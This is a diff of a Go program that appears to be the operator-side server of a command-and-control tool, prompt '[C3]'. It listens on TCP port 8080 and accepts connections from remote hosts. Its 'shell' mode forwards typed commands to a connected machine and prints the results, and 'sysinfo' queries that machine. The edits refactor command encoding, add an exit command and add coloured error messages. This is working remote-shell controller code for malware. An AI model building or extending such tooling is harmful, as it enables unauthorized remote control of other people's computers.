@@ -18,17 +18,17 @@ func shell(conn net.Conn) {
 	for {
 		fmt.Printf(color.Green + "[shell]: " + color.Reset)
 		cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
+		enc := gob.NewEncoder(conn)
 
 		if strings.Compare(cmd, "close\n") == 0 {
-			fmt.Fprintf(conn, cmd)
+			enc.Encode(cmd)
 			break
 		}
 
-		enc := gob.NewEncoder(conn)
 		enc.Encode(cmd)
-		// fmt.Fprintf(conn, cmd)
 
 		result, _ := bufio.NewReader(conn).ReadString('\n')
+		result = strings.TrimSuffix(result, "\n")
 		fmt.Println(string(result))
 	}
 	conn.Close()
@@ -55,38 +55,47 @@ func sysinfo(conn net.Conn) {
 }
 
 
+func exit(conn net.Conn) {
+	enc := gob.NewEncoder(conn)
+	enc.Encode("exit")
+}
+
+
 func handleConnection(conn net.Conn) {
 	for {
 		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
 		reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
-		reader = strings.TrimSuffix(reader, "\n")
+		//reader = strings.TrimSuffix(reader, "\n")
 
 		switch {
+		case reader == "\r\n":
+		case reader == "exit":
+			exit(conn)
 		case reader == "shell":
 			shell(conn)
 		case reader == "sysinfo":
 			sysinfo(conn)
 		default:
-			fmt.Println("Invalid command")
+			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Invalid command")
 		}
 	}
 }
 
+
 func main() {
-	fmt.Println("Start server...")
+	fmt.Println("Start server")
 
 	// Listen on port 8000
 	ln, err := net.Listen("tcp", ":8080")
 
 	if err != nil {
-		fmt.Println("Cannot listen on given port")
+		fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot listen on given port")
 	}
 
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
-			// handle error
-			continue
+			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot accept connection")
 		}
 		go handleConnection(conn)
 	}
